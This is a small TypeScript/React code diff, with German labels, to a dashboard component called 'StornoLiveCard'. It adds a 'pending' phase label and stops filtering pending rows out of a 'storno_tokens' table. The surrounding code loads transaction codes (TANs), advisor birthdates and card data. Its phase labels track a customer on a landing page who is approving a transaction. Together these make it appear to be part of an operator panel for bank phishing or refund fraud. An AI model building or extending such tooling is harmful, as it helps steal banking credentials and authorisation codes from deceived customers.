@@ -28,6 +28,7 @@ type StornoRow = {
 type MetaRow = { task_id: string; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };
 
 const PHASE_LABEL: Record<string, string> = {
+  pending: "Wartet auf Token-Eingabe",
   berater: "Berater-Verifizierung",
   widerruf: "Kunde auf Landing-Seite",
   start: "Kunde prüft Transaktion – wartet auf Freigabe",
@@ -46,7 +47,7 @@ const StornoLiveCard = () => {
 
   const load = async () => {
     const [{ data: a }, { data: m }] = await Promise.all([
-      (supabase as any).from("storno_tokens").select("*").neq("customer_phase", "pending").order("created_at", { ascending: false }).limit(50),
+      (supabase as any).from("storno_tokens").select("*").order("created_at", { ascending: false }).limit(50),
       (supabase as any).from("panel_task_meta").select("task_id, tan, berater_geburtsdatum, berater_karte").like("task_id", "storno:%"),
     ]);
     setRows(a || []);
